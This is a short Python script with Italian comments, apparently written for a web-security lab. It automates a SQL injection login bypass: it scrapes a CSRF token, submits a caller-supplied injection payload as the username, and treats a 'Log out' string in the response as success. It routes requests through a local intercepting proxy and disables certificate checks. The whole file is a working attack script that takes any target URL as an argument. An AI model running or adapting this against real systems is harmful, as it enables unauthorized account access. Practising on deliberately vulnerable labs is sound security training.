import requests
import sys
import urllib3
from bs4 import BeautifulSoup # MODULO PER ESTRARRE VALORI DA ELEMENTI HTML
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

# FUNZIONE PER ESTRARRE IL TOKEN CSRF
def get_csrf_token(s, url):
    # ESEGUE UNA RICHIESTA DA CUI POI BISOGNA ESTRARRE IL TOKEN
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    # ESTRAE IL VALORE ASSOCIATO AL PRIMO ELEMENTO INPUT DELLA PAGINA
    csrf = soup.find("input")["value"]
    return csrf

def exploit_sqli(s, url, payload):
    # OTTIENE IL TOKEN DALLA FUNZIONE get_csrf_token
    csrf = get_csrf_token(s, url)
    # SI PREPARANO I PARAMENTRI DA PASSARE NELLA RICHIESTA POST
    data = {"csrf" : csrf,
            "username" : payload,
            "password" : "empty"}
    # SI INVIA LA RICHIESTA CON IL PAYLOAD
    r = s.post(url, data=data, verify=False, proxies=proxies)
    # SI MEMORIZZA LA RISPOSTA SOTTOFORMA DI TESTO NELLA VARIABILE response
    response = r.text
    # SE NEL TESTO COMPARE LA STRINGA "Log Out" ALLORA LA SQL INJECTION HA FUNZIONATO
    if "Log out" in response:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url> <payload>" % sys.argv[0])
        print("[-] Esempio: %s example.com '1'='1" % sys.argv[0])
        sys.exit()

    # MEMORIZZA IL COOKIE DELLA SESSIONE CHE DIVENTA ARGOMENTO DELLA FUNZIONE
    # IL COOKIE SERVE PERCHE' IDENTIFICA UNA SESSIONE DI LOGIN
    # A CUI E' ASSOCIATO UN TOKEN CSRF (ESTRATTO CON LA FUNZIONE get_csrf_token)
    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] SQL Injection avvenuta con successo")
    else:
        print("[-] SQL Injection fallita")